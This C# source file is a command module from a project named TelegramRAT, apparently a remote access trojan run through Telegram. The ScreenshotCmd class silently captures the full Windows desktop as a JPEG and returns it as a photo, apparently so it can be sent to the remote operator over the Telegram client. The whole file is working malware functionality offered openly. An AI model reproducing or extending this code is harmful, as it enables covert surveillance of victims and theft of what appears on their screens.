namespace TelegramRAT.Commands;

using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using TelegramRAT.Models;
using TelegramRAT.Telegram;

internal sealed class ScreenshotCmd : IAsyncCommand
{
    private readonly TelegramClient _client;

    public ScreenshotCmd(TelegramClient client)
    {
        _client = client;
    }

    public Task<CommandResult> ExecuteAsync(string[] args)
    {
        if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            return Task.FromResult(CommandResult.Text("Screenshots require Windows"));

        var quality = args.Length > 0 && int.TryParse(args[0], out var q) ? q : 70;
        var imageData = CaptureDesktop(quality);
        return Task.FromResult(CommandResult.Photo(imageData, $"Screenshot | {DateTime.UtcNow:u}"));
    }

    private static byte[] CaptureDesktop(int quality)
    {
        var bounds = new Rectangle(0, 0, GetScreenWidth(), GetScreenHeight());
        using var bitmap = new Bitmap(bounds.Width, bounds.Height);
        using var graphics = Graphics.FromImage(bitmap);
        graphics.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);

        using var ms = new MemoryStream();
        var encoder = ImageCodecInfo.GetImageEncoders().First(e => e.FormatID == ImageFormat.Jpeg.Guid);
        var encoderParams = new EncoderParameters(1);
        encoderParams.Param[0] = new EncoderParameter(Encoder.Quality, (long)quality);
        bitmap.Save(ms, encoder, encoderParams);
        return ms.ToArray();
    }

    private static int GetScreenWidth() => GetSystemMetrics(0);
    private static int GetScreenHeight() => GetSystemMetrics(1);

    [DllImport("user32.dll")]
    private static extern int GetSystemMetrics(int nIndex);
}
